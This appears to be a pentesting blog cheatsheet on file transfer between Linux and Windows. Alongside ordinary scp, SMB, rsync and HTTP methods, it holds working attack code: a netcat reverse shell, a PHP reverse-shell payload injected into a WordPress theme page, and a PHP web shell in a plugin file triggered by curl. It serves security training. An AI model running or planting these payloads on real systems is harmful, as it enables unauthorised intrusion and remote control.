---
title: "Comprehensive guide to securely transferring files between Linux and Windows for pentesters and red teamers"
date: 2025-01-22 10:10:00 +0700
categories: [Cheatsheets]
tags: [Cheatsheets, file-transfer, pentesting, red-team]
pin: false
---

## Comprehensive guide to securely transferring files Between Linux and Windows for pentesters and red teamers

### Introduction

Transferring files between Linux and Windows securely is a crucial skill for pentesters and Red Teamers. This guide provides step-by-step instructions using various methods, including encrypted transfers, ensuring you can handle different scenarios effectively and securely.

---

### File Transfer Methods

#### Using Python HTTP Server
On Kali:
```bash
python3 -m http.server 80
```

On Windows Target Machine:
```powershell
powershell -c "curl http://127.0.0.1/nc.exe" -o nc.exe
```

---

#### Using Netcat
On Kali:
```bash
nc -nvlp 1234
```

On Windows Target Machine:
```powershell
.\nc.exe 127.0.0.1 1234 -e powershell.exe
```

---

#### Using Wget
On Kali:
```bash
python3 -m http.server 443
```

On Target Machine:
```bash
wget http://127.0.0.1/shell3.elf
```

---

#### Using PowerShell
Download `plink.exe`:
```powershell
curl http://127.0.0.1/plink.exe -o plink.exe
```

Download another tool:
```powershell
iwr http://127.0.0.1/nc.exe -outf .\cute.exe
```

---

#### Using SCP (Secure Copy Protocol)
From Linux to Windows:
```bash
scp file.txt user@127.0.0.1:/path/to/destination
```

From Windows to Linux:
```bash
scp user@127.0.0.1:/path/to/source/file.txt /local/destination
```

---

#### Using SMB (Samba)
From Linux to Windows:
```bash
smbclient //127.0.0.1/share -U user -c "put file.txt"
```

From Windows to Linux:
```bash
smbclient //127.0.0.1/share -U user -c "get file.txt"
```

---

#### Using FTP
Start FTP server on Linux:
```bash
python3 -m pyftpdlib -p 21
```

On Windows Target Machine:
```bash
ftp 127.0.0.1
# Use `put` to upload or `get` to download files.
```

---

#### Using HTTP with Curl on Windows
On Kali:
```bash
python3 -m http.server 8080
```

On Windows Target Machine:
```powershell
curl http://127.0.0.1/file.txt -o file.txt
```

---

#### Using Rsync
From Linux to Windows:
```bash
rsync -avz file.txt user@127.0.0.1:/path/to/destination
```

From Windows to Linux:
```bash
rsync -avz user@127.0.0.1:/path/to/source/file.txt /local/destination
```

---

#### Using FTP via Netcat
On Kali:
```bash
nc -nlvp 9000 < file.txt
```

On Windows Target Machine:
```bash
nc 127.0.0.1 9000 > file.txt
```

---

#### Using Python FTP Client
On Linux:
```bash
python3 -m pyftpdlib -p 21
```

On Windows:
```bash
ftp 127.0.0.1
# Login and use `put` or `get` to transfer files.
```

---

#### Using Tar Over SSH
From Linux to Windows:
```bash
tar czf - file.txt | ssh user@127.0.0.1 "tar xzf - -C /path/to/destination"
```

From Windows to Linux:
```bash
ssh user@127.0.0.1 "tar czf - -C /path/to/source ." | tar xzf - -C /local/destination
```

---

### Advanced Encrypted Transfers

#### Using OpenSSL for Secure Transfers
On Kali:
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -key key.pem -cert cert.pem -port 1337
```
Start the listener with:
```bash
sudo openssl s_server -key key.pem -cert cert.pem -port 1337
```

#### Exploit Example for File Upload and Execution
On the vulnerable page (e.g., WordPress 404 page):
```php
this is a test
<?= system('mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:1337 > /tmp/s; rm /tmp/s'); ?>
```
Update the 404 page, and trigger the shell by visiting:
```
http://localhost.htb/main/wp-content/themes/twentytwenty/404.php
```

#### Stabilizing the Shell
After getting the shell:
```bash
/usr/bin/script -qc /bin/bash /dev/null
```
Press `CTRL + Z`, then run:
```bash
stty raw -echo; fg
# Press Enter twice to stabilize
```

#### Alternative Command Injection
Replace vulnerable code with:
```php
<?php echo system($_REQUEST['cmd']); ?>
```
Example usage:
```
wp-content/plugins/akismet/wrapper.php?cmd=whoami
```
Or via `curl`:
```bash
curl -X POST http://spectra.htb/pathtoaskismet/wrapper.php -d cmd="nc 127.0.0.1 1337 -e /bin/sh"
```
